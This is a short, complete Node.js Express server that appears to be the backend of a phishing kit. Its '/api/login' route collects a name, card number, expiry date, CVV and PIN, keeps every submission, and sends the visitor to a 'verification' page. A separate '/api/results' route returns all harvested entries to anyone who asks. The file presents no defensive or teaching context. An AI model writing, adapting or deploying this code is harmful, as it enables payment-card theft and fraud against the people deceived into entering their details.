const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Stores ALL submissions
let submissions = [];

app.post('/api/login', (req, res) => {
  const { name, card, expdate, cvv, pin } = req.body;
  if (!name || !card || !expdate || !cvv || !pin) {
    return res.status(400).json({ success: false, message: 'All fields required.' });
  }

  const entry = {
    id: Date.now(),
    name,
    card,
    expdate,
    cvv,
    pin,
    time: new Date().toLocaleString()
  };

  submissions.unshift(entry); // newest first
  return res.json({ success: true, redirectUrl: '/verification.html' });
});

// Returns ALL submissions
app.get('/api/results', (req, res) => {
  res.json(submissions);
});

app.listen(PORT, () => console.log(`Running on port ${PORT}`));
